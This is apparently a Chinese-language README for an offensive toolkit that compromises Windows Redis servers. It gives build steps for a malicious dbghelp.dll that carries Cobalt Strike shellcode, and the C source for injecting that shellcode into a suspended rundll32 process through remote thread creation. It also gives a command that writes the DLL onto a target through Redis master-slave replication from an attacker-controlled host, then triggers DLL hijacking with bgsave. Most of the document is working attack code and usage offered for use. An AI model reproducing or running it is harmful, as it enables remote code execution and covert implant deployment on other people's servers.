### 编译生成

1.把`Bin\payload_x64.bin`换成CobaltStrike的x64的RAW类型shellcode，执行`compile64.bat`编译。

2.编译完成后使用`prepdll.bat`脚本调用Netclone在`brownie_x64.dll`中添加对`C:\Windows\System32\dbghelp.dll`导出函数的代理(`prepdll.bat dbghelp`)。最后复制输出文件到`redis`文件夹下执行：

### 项目优化

```
BOOL Inject_RemoteThread(LPSTR payload, SIZE_T payloadLen)
{
    STARTUPINFO si;PROCESS_INFORMATION pi;LPVOID lpMalwareBaseAddr;LPVOID lpnewVictimBaseAddr;HANDLE hThread;      // DWORD dwExitCode;
    BOOL bRet = FALSE;
    lpMalwareBaseAddr = payload;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcess("C:\\windows\\system32\\rundll32.exe", NULL, NULL, NULL,FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) == 0)
    {  return bRet;  }
    lpnewVictimBaseAddr = VirtualAllocEx(pi.hProcess, NULL, payloadLen + 1, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
    if (lpnewVictimBaseAddr == NULL)
    { return bRet; }
    WriteProcessMemory(pi.hProcess, lpnewVictimBaseAddr,(LPVOID)lpMalwareBaseAddr, payloadLen + 1, NULL);
    hThread = CreateRemoteThread(pi.hProcess, 0, 0,(LPTHREAD_START_ROUTINE)lpnewVictimBaseAddr, NULL, 0, NULL);
    WaitForSingleObject(pi.hThread, 2000);
	return bRet;
}
```

```
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        Inject_RemoteThread(payload,payloadLen);
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

```
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    HANDLE threadHandle;
    DWORD dwThread;
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
    {    // Init Code here
        HANDLE Mutexlock = CreateMutex(NULL, FALSE, "helloword!");// 创建互斥量
        if (GetLastError() == ERROR_ALREADY_EXISTS)
            {CloseHandle(Mutexlock );Mutexlock = NULL;
            }else{threadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)go, hinstDLL, 0, NULL);CloseHandle(threadHandle);}break;}
    case DLL_THREAD_ATTACH:
        // Thread-specific init code here
        break;
    case DLL_THREAD_DETACH:
        // Thread-specific cleanup code here
        break;
    case DLL_PROCESS_DETACH:
        // Cleanup code here
        break;
    }
    // The return value is used for successful DLL_PROCESS_ATTACH
    return TRUE;
}
```

漏洞利用

使用Redis主从同步脚本写入后执行`bgsave`触发DLL劫持：

```python
python3 RedisWriteFile.py --rhost 192.168.200.97 --rport 6379 --lhost 192.168.200.138 --lport 16379 --rpath "D:/phpstudy_pro/Extensions/redis3.0.504" --rfile "dbghelp.dll" --lfile "dbghelp.dll"
```

### DLLHijacker

```
Usage:
1. python3 ./DLLHijacker.py target.dll
2. use vs2019 to open the project, and rewrite the Hijack function,You can just modify the shellcode or modify the way shellcode is executed at the same time.
```

劫持Windows x64下的dbghelp.dll的具体方法：
1）[DLLHijacker](https://github.com/kiwings/DLLHijacker) +目标Redis的系统版本的dbghelp.dll， 生成vs项目。
2）vs项目修改：

```
1、将dllmain.c中 shellcode_calc[] 的值替换为cs生成的shellcode   
2、为了避免只能劫持1次dll，在dllmain.cpp的 Hijack();后增加 FreeLibrary(hModule);  
3、修改活动解决方案为Realease，x64  
4、修改项目属性的sdk版本、平台工具集为本地vs可用的值  
```

3）编译生成恶意dbghelp.dll，复制到本工具目录下。
4）使用本工具执行攻击。

### 参考

+ [kiwings/DLLHijacker (github.com)](https://github.com/kiwings/DLLHijacker)
+ [0671/RabR: Redis-Attack By Replication (通过主从复制攻击Redis) (github.com)](https://github.com/0671/RabR)

